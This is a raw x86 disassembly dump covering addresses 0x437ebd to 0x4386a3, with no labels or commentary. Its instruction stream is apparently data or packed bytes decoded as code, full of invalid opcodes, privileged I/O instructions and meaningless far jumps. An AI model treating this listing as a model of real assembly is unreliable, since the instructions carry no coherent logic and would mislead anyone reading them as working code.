  437ebd:	fstp   TBYTE PTR [edx-0x664d6c1e]
  437ec3:	and    al,0x20
  437ec5:	arpl   WORD PTR [edi+0x17481c37],dx
  437ecb:	jmp    0xd711b263
  437ed0:	cli    
  437ed1:	add    cl,BYTE PTR ds:0xcff775ae
  437ed7:	in     eax,dx
  437ed8:	xchg   ebx,eax
  437ed9:	mov    al,ds:0x63fe52ce
  437ede:	xchg   edi,eax
  437edf:	inc    ebp
  437ee0:	lds    esp,FWORD PTR [ebx+eax*2+0x5c]
  437ee4:	pop    ecx
  437ee5:	into   
  437ee6:	cmp    eax,0x45db0d72
  437eeb:	repnz xchg ebx,eax
  437eed:	mov    dl,0x97
  437eef:	sbb    DWORD PTR [ecx],ebx
  437ef1:	lds    ebp,FWORD PTR [ebx-0x3a]
  437ef4:	aam    0x44
  437ef6:	sbb    dh,dh
  437ef8:	lahf   
  437ef9:	inc    ebx
  437efa:	sbb    ah,BYTE PTR [esi+edi*8+0x4c]
  437efe:	push   es
  437eff:	lahf   
  437f00:	push   ds
  437f01:	inc    esp
  437f02:	jmp    0x6ffc:0xebbaa8ee
  437f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437f0a:	dec    esi
  437f0b:	jmp    0x437f10
  437f10:	add    BYTE PTR [edx],dl
  437f12:	neg    DWORD PTR [ecx]
  437f14:	(bad)  
  437f15:	out    dx,al
  437f16:	div    BYTE PTR fs:[ebx]
  437f19:	stos   DWORD PTR es:[edi],eax
  437f1a:	iret   
  437f1b:	jmp    0x2a03:0xf0f52200
  437f22:	or     esp,ebp
  437f24:	pop    edi
  437f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437f26:	or     eax,0x857908ac
  437f2b:	xchg   ecx,eax
  437f2c:	je     0x437f7b
  437f2e:	iret   
  437f2f:	cmp    eax,0xfeda958b
  437f34:	test   BYTE PTR [esi],al
  437f36:	mov    ebp,0x9ff25304
  437f3b:	xor    dl,BYTE PTR [eax]
  437f3d:	loop   0x437ef3
  437f3f:	cmp    eax,0xe50ce256
  437f44:	adc    BYTE PTR [ebx+esi*8+0x3b520867],bh
  437f4b:	jmp    0x65842c3f
  437f50:	in     al,dx
  437f51:	push   edx
  437f52:	in     al,dx
  437f53:	pop    esi
  437f54:	and    al,0x29
  437f56:	mov    al,ds:0xf0f7c691
  437f5b:	sbb    DWORD PTR [eax],eax
  437f5d:	cld    
  437f5e:	dec    ebx
  437f5f:	cli    
  437f60:	or     ebp,0x3b
  437f63:	imul   ebp,esp,0x8b4083f5
  437f69:	enter  0x9188,0x86
  437f6d:	test   DWORD PTR [ebx-0xc93fff2],esi
  437f73:	pop    esi
  437f74:	push   cs
  437f75:	add    BYTE PTR [eax],al
  437f77:	add    BYTE PTR [eax],al
  437f79:	add    BYTE PTR [edx+0x7a],dh
  437f7c:	inc    ch
  437f7e:	stc    
  437f7f:	mov    ch,0x91
  437f81:	inc    ebp
  437f82:	in     eax,0x2d
  437f84:	lds    eax,FWORD PTR [ecx]
  437f86:	jmp    0xc1eb93d
  437f8b:	push   cs
  437f8c:	sub    DWORD PTR [eax-0x7cea28db],ecx
  437f92:	mov    cl,0xb3
  437f94:	pop    edi
  437f95:	sbb    DWORD PTR [eax-0x61],esi
  437f98:	sbb    cl,BYTE PTR [ebx+0x4be91c90]
  437f9e:	dec    ebp
  437f9f:	in     eax,dx
  437fa0:	pop    sp
  437fa2:	je     0x437f6c
  437fa4:	rol    DWORD PTR [edx+0xed904],1
  437faa:	xchg   ebx,eax
  437fab:	fisttp DWORD PTR [esi]
  437fad:	add    BYTE PTR [ebx-0x27],bh
  437fb0:	gs inc ebx
  437fb2:	mov    WORD PTR [ebx+0x40887399],cs
  437fb8:	lods   al,BYTE PTR ds:[esi]
  437fb9:	xchg   esp,edx
  437fbb:	push   esi
  437fbd:	out    0x4c,eax
  437fbf:	arpl   WORD PTR [ecx-0x16cbf407],bx
  437fc5:	mov    cl,0xce
  437fc7:	hlt    
  437fc8:	(bad)  
  437fc9:	loopne 0x437f9a
  437fcb:	push   edx
  437fcc:	push   esi
  437fcd:	and    al,0x9c
  437fcf:	pop    eax
  437fd0:	call   0x37c8:0x8dc3c502
  437fd7:	arpl   WORD PTR [esi-0x6c23d001],cx
  437fdd:	rol    BYTE PTR [eax],0x0
  437fe0:	add    BYTE PTR [eax],al
  437fe2:	add    BYTE PTR [esi+edi*4+0xf7bf88d],bl
  437fe9:	xlat   BYTE PTR ds:[ebx]
  437fea:	test   BYTE PTR [esi],cl
  437fec:	pusha  
  437fed:	adc    al,BYTE PTR [eax]
  437fef:	nop
  437ff0:	ror    ch,0x7c
  437ff3:	xchg   esp,eax
  437ff4:	pop    eax
  437ff5:	call   0xa043:0x65dc7efe
  437ffc:	inc    ebx
  437ffd:	cli    
  437ffe:	in     al,0x9f
  438000:	pop    eax
  438001:	pop    esp
  438002:	mov    BYTE PTR [eax+0xafe0edb],dl
  438008:	pop    ds
  438009:	fisttp WORD PTR [eax]
  43800b:	std    
  43800c:	call   0x8e:0x7e13086a
  438013:	nop
  438014:	fisttp DWORD PTR [esi]
  438016:	test   esi,ecx
  438018:	mov    dl,0xbd
  43801a:	adc    cl,BYTE PTR [edi+0x579af5b2]
  438020:	mov    bl,0xf5
  438022:	add    ecx,DWORD PTR [ebp*1-0x4d6ffc8f]
  438029:	sub    ebp,esp
  43802b:	or     al,0x35
  43802d:	jns    0x438032
  43802f:	nop
  438030:	mov    dl,0xe0
  438032:	rol    BYTE PTR [eax+edi*4],0x78
  438036:	mov    edi,DWORD PTR [esi+0x4f]
  438039:	fnstsw WORD PTR [ecx-0x34]
  43803c:	xchg   esi,eax
  43803d:	cld    
  43803e:	xchg   DWORD PTR [eax+0x46],edx
  438041:	sbb    BYTE PTR ds:0x7eed4769,dh
  438047:	add    BYTE PTR [eax],al
  438049:	add    BYTE PTR [eax],al
  43804b:	add    dl,cl
  43804d:	push   edx
  43804e:	jge    0x4380bf
  438050:	mov    cl,ch
  438052:	imul   eax,DWORD PTR [esi+0x796d4650],0xffffffcc
  438059:	xchg   esi,eax
  43805a:	int3   
  43805b:	xchg   DWORD PTR [eax+0x46],edx
  43805e:	mov    al,ds:0xf5361a87
  438063:	add    edx,DWORD PTR [eax-0x2d8747ba]
  438069:	mov    edx,0x46909b78
  43806e:	loope  0x4380ab
  438070:	mov    ds:0xf8bd60a2,eax
  438075:	mov    al,0xf8
  438077:	add    edx,DWORD PTR [eax-0x35870c27]
  43807d:	fldcw  WORD PTR [esi]
  43807f:	add    edx,DWORD PTR [eax+0x184d78b2]
  438085:	mov    dl,0xf5
  438087:	add    esp,esi
  438089:	inc    eax
  43808a:	loopne 0x438104
  43808c:	dec    edx
  43808d:	push   esi
  43808e:	pusha  
  43808f:	inc    ebp
  438090:	jo     0x4380c3
  438092:	xchg   ebx,eax
  438093:	and    edx,DWORD PTR [eax+0x6f8f0e31]
  438099:	mov    dl,0x8f
  43809b:	xchg   DWORD PTR [ebx+0x37393db2],ebx
  4380a1:	clc    
  4380a2:	cmc    
  4380a3:	ja     0x438052
  4380a5:	int3   
  4380a6:	jmp    0x886a:0x1b965063
  4380ad:	xchg   esi,eax
  4380ae:	add    ch,cl
  4380b0:	add    BYTE PTR [eax],al
  4380b2:	add    BYTE PTR [eax],al
  4380b4:	add    BYTE PTR [eax-0x5e566d76],al
  4380ba:	xchg   ebx,eax
  4380bb:	(bad)  
  4380bc:	ja     0x4380c2
  4380be:	mov    bl,0xe
  4380c0:	jmp    0x6a58c05a
  4380c5:	retf   0xe3e
  4380c8:	jmp    0xfea24e60
  4380cd:	out    0x28,eax
  4380cf:	xchg   edx,eax
  4380d0:	jmp    0x10a63368
  4380d5:	xlat   BYTE PTR ds:[ebx]
  4380d6:	xor    BYTE PTR [edx+0x27b293e9],bl
  4380dc:	stos   BYTE PTR es:[edi],al
  4380dd:	cwde   
  4380de:	imul   ecx,DWORD PTR [edi+0x48499671],0xd4a2d172
  4380e8:	jmp    0xe9d95480
  4380ed:	xchg   ebx,eax
  4380ee:	mov    dl,0x97
  4380f0:	pop    ds
  4380f1:	cld    
  4380f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4380f4:	inc    esi
  4380f5:	or     esi,DWORD PTR [esi]
  4380f7:	xchg   esp,eax
  4380f8:	ins    DWORD PTR es:[edi],dx
  4380f9:	xchg   esp,eax
  4380fa:	mov    dl,0xe
  4380fc:	mov    eax,ds:0xa15146cb
  438101:	mov    ebx,0x52725f3f
  438106:	mov    edx,0x4694118f
  43810b:	sbb    BYTE PTR [ecx+0x4df6be80],ah
  438111:	xchg   esi,eax
  438112:	mov    dl,0xe
  438114:	add    BYTE PTR [edx+0x1ff6b1],al
  43811a:	add    BYTE PTR [eax],al
  43811c:	add    BYTE PTR [eax],al
  43811e:	mov    eax,0x7f830eaf
  438123:	dec    esi
  438124:	push   cs
  438125:	add    BYTE PTR [ecx+0x42075fb5],ch
  43812b:	or     esi,esi
  43812d:	outs   dx,DWORD PTR ds:[esi]
  43812e:	mov    eax,ds:0x6d8a0eaf
  438133:	rcl    BYTE PTR ds:0x13a2f084,cl
  438139:	or     DWORD PTR [edi],0x48
  43813c:	push   cs
  43813d:	add    BYTE PTR [ecx-0x4b],bh
  438140:	pop    edi
  438141:	add    cl,BYTE PTR [edx+0x5945911c]
  438147:	inc    edi
  438148:	push   es
  438149:	jmp    0x4381a6
  43814b:	dec    esp
  43814c:	dec    edi
  43814d:	or     BYTE PTR [edx-0x10],bh
  438150:	and    BYTE PTR [ebp+edx*2-0x41],bh
  438154:	addr16 sbb cl,ch
  438157:	not    DWORD PTR [eax]
  438159:	jne    0x438195
  43815b:	cmp    BYTE PTR [edi+0x10],bl
  43815e:	stos   BYTE PTR es:[edi],al
  43815f:	xchg   dh,dh
  438161:	adc    eax,0x3be538bf
  438166:	jmp    0xe538:0xaf7e8fc7
  43816d:	inc    edi
  43816e:	mov    ds:0x39009231,eax
  438173:	scas   eax,DWORD PTR es:[edi]
  438174:	xchg   ecx,eax
  438175:	dec    ebp
  438176:	sbb    DWORD PTR [ecx],esp
  438178:	mov    esi,0xeb476a22
  43817d:	mov    dh,BYTE PTR [esi+0x5b4898]
  438183:	add    BYTE PTR [eax],al
  438185:	add    BYTE PTR [eax],al
  438187:	jb     0x43819b
  438189:	inc    edi
  43818a:	ret    0xaedd
  43818d:	aas    
  43818e:	mov    ebx,DWORD PTR [ebp+0x2a34fa34]
  438194:	cmp    DWORD PTR ds:0x6ca2908b,0xbc4041
  43819e:	or     ebp,DWORD PTR fs:[ecx]
  4381a1:	fild   WORD PTR [edi+ebx*1-0x6ffff08b]
  4381a8:	push   esi
  4381a9:	cmp    BYTE PTR [eax-0x2f],ah
  4381ac:	scas   al,BYTE PTR es:[edi]
  4381ad:	adc    ecx,edi
  4381af:	sbb    DWORD PTR [eax-0x4c],0xffffffff
  4381b3:	mov    bh,0xb2
  4381b5:	ss cli 
  4381b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4381b8:	dec    edi
  4381b9:	add    BYTE PTR [ebx-0xe119b5a],0x4e
  4381c0:	test   eax,0xabdf8514
  4381c5:	(bad)  
  4381c6:	pop    ds
  4381c7:	adc    edx,DWORD PTR [ebx-0x2415f81e]
  4381cd:	imul   ecx,edx,0xfa2f3468
  4381d3:	outs   dx,DWORD PTR ds:[esi]
  4381d4:	inc    ebp
  4381d5:	test   al,0xe8
  4381d7:	std    
  4381d8:	test   BYTE PTR [eax-0x75d5f407],bl
  4381de:	outs   dx,DWORD PTR ds:[esi]
  4381df:	shl    BYTE PTR [eax],cl
  4381e1:	xchg   ebp,eax
  4381e2:	pop    ecx
  4381e3:	out    dx,al
  4381e4:	xchg   esp,eax
  4381e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4381e6:	mov    ebp,0x407833de
  4381eb:	add    BYTE PTR [eax],al
  4381ed:	add    BYTE PTR [eax],al
  4381ef:	add    BYTE PTR [edi],bh
  4381f1:	pop    ecx
  4381f2:	mov    es,eax
  4381f4:	mov    esp,0x38ca697c
  4381f9:	cli    
  4381fa:	or     bh,dl
  4381fc:	daa    
  4381fd:	push   ebx
  4381fe:	lea    ecx,[eax+0x7d0edb90]
  438204:	xchg   esi,eax
  438205:	add    ecx,DWORD PTR [edi]
  438207:	jb     0x4381f7
  438209:	inc    esp
  43820a:	adc    DWORD PTR [ebp+0x6d],edi
  43820d:	mov    edx,DWORD PTR [edx]
  43820f:	xchg   DWORD PTR [ebp+0x7f],edx
  438212:	imul   edi,DWORD PTR ds:0x275eb28c,0x8bb23bec
  43821c:	mov    dh,0xed
  43821e:	je     0x4381ad
  438220:	fld    QWORD PTR [edx+esi*1-0x7]
  438224:	and    esi,esi
  438226:	popa   
  438227:	das    
  438228:	loopne 0x43827a
  43822a:	pusha  
  43822b:	clc    
  43822c:	push   edx
  43822d:	mov    al,BYTE PTR [ebp+0x79da9043]
  438233:	push   ss
  438234:	mov    ecx,0x1b043ec9
  438239:	jo     0x4381e0
  43823b:	xor    ebx,DWORD PTR [ebx]
  43823d:	js     0x438204
  43823f:	fwait
  438240:	mov    eax,eax
  438242:	fisttp DWORD PTR [eax-0x65d64cac]
  438248:	mov    dh,ch
  43824a:	mov    edi,0xe0d705b5
  43824f:	xor    al,0xe3
  438251:	pusha  
  438252:	add    al,0x7d
  438254:	add    BYTE PTR [eax],al
  438256:	add    BYTE PTR [eax],al
  438258:	add    BYTE PTR [edi-0x37],bh
  43825b:	dec    ebx
  43825c:	pop    edi
  43825d:	nop
  43825e:	mov    dl,0xf5
  438260:	jl     0x43823b
  438262:	bound  ecx,QWORD PTR [ebp-0x64362ff0]
  438268:	jl     0x4382ca
  43826a:	das    
  43826b:	imul   edi,eax,0x13
  43826e:	test   eax,0x3d9003f6
  438273:	add    al,0x10
  438275:	ins    DWORD PTR es:[edi],dx
  438276:	xlat   BYTE PTR ds:[ebx]
  438277:	bound  eax,QWORD PTR [eax+0x3f5b20c]
  43827d:	das    
  43827e:	inc    ebp
  43827f:	loopne 0x4382f7
  438281:	rol    DWORD PTR [edx-0x2],1
  438284:	pop    eax
  438285:	or     BYTE PTR [edx-0x4b5cfc0b],dh
  43828b:	pusha  
  43828c:	mov    esi,0x9b3b3d60
  438291:	out    0x51,al
  438293:	push   cs
  438294:	aaa    
  438295:	or     BYTE PTR [esi],ch
  438297:	into   
  438298:	fidiv  WORD PTR [edi-0x2c]
  43829b:	or     eax,0xab4793e9
  4382a0:	jno    0x438235
  4382a2:	mov    dl,0xe
  4382a4:	jmp    0x438234
  4382a6:	arpl   WORD PTR [edi],sp
  4382a8:	scas   al,BYTE PTR es:[edi]
  4382a9:	xchg   DWORD PTR [esi],edi
  4382ab:	inc    eax
  4382ac:	je     0x438236
  4382ae:	push   edx
  4382af:	js     0x4382a4
  4382b1:	inc    esp
  4382b2:	leave  
  4382b3:	xchg   ebp,eax
  4382b4:	lods   eax,DWORD PTR ds:[esi]
  4382b5:	fist   WORD PTR [eax+0x2fb7a897]
  4382bb:	push   edx
  4382bc:	or     eax,0x0
  4382c1:	add    al,cl
  4382c3:	dec    esi
  4382c4:	add    DWORD PTR [eax+edx*2-0x72],ebp
  4382c8:	cmp    DWORD PTR es:[ecx-0x35],esp
  4382cc:	bound  edx,QWORD PTR [ebp+0x15]
  4382cf:	push   esi
  4382d0:	xor    bh,ch
  4382d2:	or     al,0x77
  4382d4:	xor    ch,BYTE PTR [ecx]
  4382d6:	and    al,0x53
  4382d8:	fsubr  st,st(1)
  4382da:	xchg   ebx,eax
  4382db:	inc    ebp
  4382dc:	rcl    ch,cl
  4382de:	adc    bl,dh
  4382e0:	pusha  
  4382e1:	enter  0xc589,0x99
  4382e5:	xor    eax,0x8145a470
  4382ea:	and    al,0x57
  4382ec:	jmp    0x43827c
  4382ee:	popf   
  4382ef:	cmp    edx,DWORD PTR [edx-0x33]
  4382f2:	pop    edi
  4382f3:	js     0x438332
  4382f5:	ins    BYTE PTR es:[edi],dx
  4382f6:	ror    BYTE PTR [esi+0x76b9190a],1
  4382fc:	xor    bh,BYTE PTR [ecx+0x66e0c41b]
  438302:	pop    ss
  438303:	fcom   QWORD PTR cs:[ecx+0x5]
  438307:	data16 in al,dx
  438309:	push   esi
  43830a:	adc    ebx,esi
  43830c:	popa   
  43830d:	xlat   BYTE PTR ds:[ebx]
  43830e:	jns    0x4382d7
  438310:	pop    edx
  438311:	add    BYTE PTR [edx+0x61cf9118],al
  438317:	gs (bad) 
  438319:	inc    dh
  43831b:	dec    ebx
  43831c:	mov    BYTE PTR [ebp+0x6a73a2a2],0xb6
  438323:	das    
  438324:	jns    0x43832a
  438326:	add    BYTE PTR [eax],al
  438328:	add    BYTE PTR [eax],al
  43832a:	add    BYTE PTR [esi+0x2912fec1],al
  438330:	mov    ah,0x8f
  438332:	sar    ah,0x8c
  438335:	and    ebp,DWORD PTR [ebx-0x3f]
  438338:	mov    bh,0x50
  43833a:	(bad)  
  43833b:	mul    BYTE PTR [ebx+0x2c0d6f93]
  438341:	mov    BYTE PTR [esi+eiz*4],cl
  438344:	xor    BYTE PTR [ecx-0x13539689],dl
  43834a:	imul   edi,DWORD PTR [eax-0x577f67b6],0x25e80eb3
  438354:	enter  0xffea,0x4
  438358:	jne    0x438360
  43835a:	push   eax
  43835b:	hlt    
  43835c:	cmp    eax,0xb36901ee
  438361:	not    BYTE PTR [ecx-0x721acf8e]
  438367:	mov    edx,0xf78d5ae6
  43836c:	and    ebp,ebx
  43836e:	jmp    FWORD PTR [ecx+0x2b]
  438371:	ins    BYTE PTR es:[edi],dx
  438372:	or     eax,DWORD PTR [esi]
  438374:	xor    BYTE PTR [edi+0xeaeb98e],dl
  43837a:	add    BYTE PTR [ecx],ah
  43837c:	cli    
  43837d:	or     al,0x0
  43837f:	sub    DWORD PTR [esi-0x6f],edi
  438382:	retf   
  438383:	adc    DWORD PTR [esi+0x2cb6fd68],edx
  438389:	(bad)  
  43838b:	push   edi
  43838c:	mov    ebx,DWORD PTR [ebp+0xe]
  43838f:	add    BYTE PTR [eax],al
  438391:	add    BYTE PTR [eax],al
  438393:	add    BYTE PTR [eax-0x6f5ba3a0],dl
  438399:	(bad)  [esi]
  43839b:	test   DWORD PTR [edi+0x29],ebx
  43839e:	xchg   DWORD PTR [ecx-0x39],edi
  4383a1:	mov    BYTE PTR [ecx+ebx*2+0x7d381e5e],dl
  4383a8:	int3   
  4383a9:	aam    0xcf
  4383ab:	dec    edi
  4383ac:	inc    esi
  4383ad:	inc    esp
  4383ae:	adc    BYTE PTR [ecx-0x19],0x5e
  4383b2:	dec    ebx
  4383b3:	add    BYTE PTR [eax+0x404a67d9],dl
  4383b9:	mov    cl,0xc0
  4383bb:	cmp    bh,cl
  4383bd:	scas   eax,DWORD PTR es:[edi]
  4383be:	push   0x1bc80df8
  4383c3:	das    
  4383c4:	mov    edi,0xc7850b46
  4383c9:	xlat   BYTE PTR ds:[ebx]
  4383ca:	sbb    DWORD PTR [eax-0x48],esp
  4383cd:	push   ebx
  4383ce:	xor    bh,dl
  4383d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4383d1:	dec    esp
  4383d2:	shl    BYTE PTR [ebx-0x80],cl
  4383d5:	loopne 0x438432
  4383d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4383d8:	nop
  4383d9:	(bad)  [esi]
  4383db:	test   esi,ebx
  4383dd:	stos   DWORD PTR es:[edi],eax
  4383de:	mov    bh,BYTE PTR [ecx]
  4383e0:	mov    DWORD PTR [ecx+edx*4],0xcec8a0e5
  4383e7:	xor    eax,0xbff593cf
  4383ec:	adc    edi,DWORD PTR [eax+edx*1]
  4383ef:	xchg   DWORD PTR [esi],ecx
  4383f1:	inc    esp
  4383f2:	adc    al,BYTE PTR [eax]
  4383f4:	nop
  4383f5:	jl     0x43842b
  4383f7:	push   edi
  4383f8:	add    BYTE PTR [eax],al
  4383fa:	add    BYTE PTR [eax],al
  4383fc:	add    BYTE PTR [ebx+0x7f],dl
  4383ff:	gs in  al,dx
  438401:	adc    esp,DWORD PTR [eax]
  438403:	and    dl,BYTE PTR [edx+0x1b]
  438406:	dec    ebx
  438407:	cmp    ecx,edi
  438409:	push   es
  43840a:	js     0x43841e
  43840c:	add    BYTE PTR [eax+0x38502450],dl
  438412:	mov    bl,0x55
  438414:	(bad)  
  438415:	sub    dh,al
  438417:	jno    0x4383dd
  438419:	mov    DWORD PTR [esi],ebp
  43841b:	and    BYTE PTR [eax+edx*4],al
  43841e:	mov    dl,0x8
  438420:	test   DWORD PTR [ebp+0x18460de0],edi
  438426:	mov    bl,0xf5
  438428:	add    esp,DWORD PTR [ecx+0x37]
  43842b:	mov    bl,0x13
  43842d:	mov    DWORD PTR [esi+0x2f],ebp
  438430:	sub    eax,0x9c1d395f
  438435:	gs push ebx
  438437:	or     eax,DWORD PTR [ebp+0x46d045d]
  43843d:	nop
  43843e:	mov    dl,0xf7
  438440:	hlt    
  438441:	adc    cl,BYTE PTR ds:0x379003f5
  438447:	mov    ebx,0x70ad3623
  43844c:	add    ecx,DWORD PTR [edi]
  43844e:	jo     0x438461
  438450:	jns    0x4384c1
  438452:	scas   al,BYTE PTR es:[edi]
  438453:	pop    esi
  438454:	ss mov ah,0x37
  438457:	and    bh,BYTE PTR [eax-0x5bbdc4b9]
  43845d:	pshufw mm1,mm5,0x9b
  438461:	add    BYTE PTR [eax],al
  438463:	add    BYTE PTR [eax],al
  438465:	add    ch,dh
  438467:	pop    ecx
  438468:	aam    0x84
  43846a:	loope  0x4384a3
  43846c:	xor    bh,BYTE PTR [eax-0x5bcdc820]
  438472:	push   0x6984a7c4
  438477:	xchg   dh,dh
  438479:	vmwrite ebx,DWORD PTR [eax-0x21]
  43847d:	sbb    DWORD PTR [ebx-0x3fafc5c9],eax
  438483:	pop    ebp
  438484:	pushf  
  438485:	or     eax,0xbbbadac4
  43848a:	nop
  43848b:	mov    dl,0x78
  43848d:	mov    edi,0xa90e2fa4
  438492:	xchg   BYTE PTR [eax+0x78],ch
  438495:	jmp    0x830b:0xc0de61a6
  43849c:	ja     0x4384fc
  43849e:	adc    al,0x4c
  4384a0:	or     eax,0x3dc25664
  4384a5:	pop    esp
  4384a6:	(bad)  
  4384a7:	shl    ch,cl
  4384a9:	xor    BYTE PTR [eax],ah
  4384ab:	retf   
  4384ac:	jmp    0xb664:0xfc3e92fd
  4384b3:	idiv   BYTE PTR ds:0x5139bc96
  4384b9:	sbb    DWORD PTR [ebx-0x4f6a6c7],esp
  4384bf:	lods   al,BYTE PTR ds:[esi]
  4384c0:	ficom  WORD PTR [esi]
  4384c2:	or     al,0x2e
  4384c4:	into   
  4384c5:	xchg   ebp,eax
  4384c6:	mov    ebp,0xac9973
  4384cb:	add    BYTE PTR [eax],al
  4384cd:	add    BYTE PTR [eax],al
  4384cf:	push   edi
  4384d0:	bound  edi,QWORD PTR ds:0x3dc27e6c
  4384d6:	fs jle 0x4384ab
  4384d9:	cmc    
  4384da:	mov    dh,0x1f
  4384dc:	retf   
  4384dd:	jmp    0xae38:0x13e4c6d
  4384e4:	leave  
  4384e5:	cwde   
  4384e6:	sub    al,0xd8
  4384e8:	popa   
  4384e9:	js     0x4384ca
  4384eb:	and    BYTE PTR [eax-0x22],dh
  4384ee:	sbb    DWORD PTR [ecx],esp
  4384f0:	js     0x4384e0
  4384f2:	ror    edx,1
  4384f4:	aam    0xea
  4384f6:	mov    dh,0x13
  4384f8:	add    DWORD PTR [edx-0x684d6c17],esi
  4384fe:	aaa    
  4384ff:	cmp    al,0xcc
  438501:	cmp    ebx,edi
  438503:	adc    cl,dl
  438505:	dec    edx
  438506:	aaa    
  438507:	lds    eax,FWORD PTR ds:0x626c2897
  43850d:	xchg   edi,eax
  43850e:	add    BYTE PTR [eax-0x1c],cl
  438511:	xor    esi,eax
  438513:	inc    ebp
  438514:	stos   BYTE PTR es:[edi],al
  438515:	xchg   ecx,eax
  438516:	push   esp
  438517:	inc    ebp
  438518:	mov    eax,0x85470497
  43851d:	sub    ebx,DWORD PTR [eax+0x46]
  438520:	mov    BYTE PTR [eax+ebp*8+0xb],bl
  438524:	mov    edx,0xadf9000e
  438529:	icebp  
  43852a:	xor    BYTE PTR [edx+0x1d],dh
  43852d:	add    BYTE PTR [eax],0xf9
  438530:	scas   eax,DWORD PTR es:[edi]
  438531:	(bad)  
  438532:	rol    BYTE PTR [eax],cl
  438534:	add    BYTE PTR [eax],al
  438536:	add    BYTE PTR [eax],al
  438538:	aas    
  438539:	mov    WORD PTR [ecx+0x21b68574],ss
  43853f:	(bad)  
  438540:	cmp    eax,0x698191a4
  438545:	scas   al,BYTE PTR es:[edi]
  438546:	push   cs
  438547:	add    dl,ch
  438549:	jns    0x43856c
  43854b:	ret    0x9ffe
  43854e:	xor    esi,edx
  438550:	xor    BYTE PTR ds:0xafb9007e,ch
  438556:	xchg   ebx,eax
  438557:	xchg   ecx,eax
  438558:	gs scas al,BYTE PTR es:[edi]
  43855a:	push   cs
  43855b:	add    BYTE PTR [edx+0x1fc03c60],dl
  438561:	outs   dx,BYTE PTR ds:[esi]
  438562:	adc    al,BYTE PTR [eax]
  438564:	push   0x22563fdb
  438569:	ds cmp eax,0xdcde678b
  43856f:	inc    eax
  438570:	mov    DWORD PTR [edi-0x541cf79e],esi
  438576:	inc    esi
  438577:	jmp    0x5233ff
  43857c:	repnz jecxz 0x4385ad
  43857f:	and    al,0x8a
  438581:	push   esi
  438582:	jno    0x43857d
  438584:	xor    BYTE PTR cs:[edx+0x74ba84c0],dl
  43858b:	add    dl,BYTE PTR [eax+0x26857730]
  438591:	cmp    eax,0x4090000f
  438596:	sti    
  438597:	and    ebx,DWORD PTR [esi+ecx*2+0x7a41]
  43859e:	add    BYTE PTR [eax],al
  4385a0:	add    bl,dl
  4385a2:	push   eax
  4385a3:	shl    DWORD PTR [ebx],cl
  4385a5:	mov    BYTE PTR [eax+0x7d],dl
  4385a8:	nop
  4385a9:	nop
  4385aa:	(bad)  [esi]
  4385ac:	mov    ebx,DWORD PTR [ecx+eiz*4+0x13]
  4385b0:	enter  0x8c5b,0xe8
  4385b4:	push   edx
  4385b5:	sbb    eax,0xcf3518cd
  4385ba:	add    edi,DWORD PTR [ebp+0x7728614d]
  4385c0:	mov    ebp,0x85907bf9
  4385c5:	push   ds
  4385c6:	pop    ebp
  4385c7:	lldt   WORD PTR [eax-0x7f84ae30]
  4385ce:	ficom  DWORD PTR [eax+edx*4+0x250ed990]
  4385d5:	fcom   DWORD PTR [ecx+0x7d]
  4385d8:	xchg   esp,eax
  4385d9:	nop
  4385da:	(bad)  [esi]
  4385dc:	in     eax,0x2
  4385de:	pop    eax
  4385df:	mov    ch,0x94
  4385e1:	nop
  4385e2:	(bad)  [esi]
  4385e4:	add    BYTE PTR [ebx],bl
  4385e6:	xchg   ebx,eax
  4385e7:	xchg   DWORD PTR [eax],eax
  4385e9:	nop
  4385ea:	fldcw  WORD PTR [ecx]
  4385ec:	sti    
  4385ed:	pop    ds
  4385ee:	mov    al,0x93
  4385f0:	jmp    0x43860f
  4385f2:	pop    esi
  4385f3:	cdq    
  4385f4:	std    
  4385f5:	in     al,0xf0
  4385f7:	in     eax,0x23
  4385f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4385fa:	inc    esp
  4385fb:	pop    ecx
  4385fc:	stc    
  4385fd:	mov    al,ds:0x6785256
  438602:	push   ebp
  438603:	(bad)  
  438604:	and    eax,DWORD PTR [eax]
  438606:	add    BYTE PTR [eax],al
  438608:	add    BYTE PTR [eax],al
  43860a:	mov    al,0xaa
  43860c:	cmp    ah,ch
  43860e:	fbstp  TBYTE PTR [edx+0x4e7707ff]
  438614:	mov    WORD PTR [ecx+0x28312e59],es
  43861a:	test   al,0x2f
  43861c:	xor    DWORD PTR [eax],ebp
  43861e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43861f:	bound  esp,QWORD PTR [eax+0x47]
  438622:	cmp    eax,0xe048bff1
  438627:	sub    esi,DWORD PTR [ecx]
  438629:	sub    BYTE PTR [eax+0x38527063],cl
  43862f:	xor    BYTE PTR [esi-0x7f],ch
  438632:	sbb    DWORD PTR [esi],ebp
  438634:	dec    ebp
  438635:	xchg   DWORD PTR ds:0x5a8d2c3b,edi
  43863b:	bound  eax,QWORD PTR [ebx-0x3d]
  43863e:	xchg   edi,eax
  43863f:	stos   BYTE PTR es:[edi],al
  438640:	in     al,0x86
  438642:	mov    cl,0x2b
  438645:	cmp    ecx,0x15281946
  43864b:	icebp  
  43864c:	dec    esp
  43864d:	mov    al,0xe8
  43864f:	shl    DWORD PTR [ebx],0x88
  438652:	rol    BYTE PTR [esi-0x6f],1
  438655:	adc    DWORD PTR [esi+edx*4-0x1f],0x3
  43865a:	inc    esp
  43865b:	call   0x8088:0xa64a5d72
  438662:	inc    esp
  438663:	xchg   esi,eax
  438664:	rol    DWORD PTR [eax+0x6bd1963c],0x89
  43866b:	mov    ebx,0x80fb
  438670:	add    BYTE PTR [eax],al
  438672:	add    BYTE PTR ds:0x1c4d2feb,cl
  438678:	cwde   
  438679:	clc    
  43867a:	jl     0x4386d9
  43867c:	mov    edi,0x76159f40
  438681:	adc    DWORD PTR [eax*1-0x6ffc92e7],esp
  438688:	mov    dl,0xf5
  43868a:	mov    ch,BYTE PTR [eax-0x5556f17b]
  438690:	xor    al,0x9a
  438692:	jmp    0x7d5f392a
  438697:	rcr    DWORD PTR [ebx+0x4c],cl
  43869a:	cmp    al,0x35
  43869c:	push   0x2d93f9d0
  4386a1:	adc    dl,dl
  4386a3:	sbb    dh,BYTE PTR [esi+eax*4]
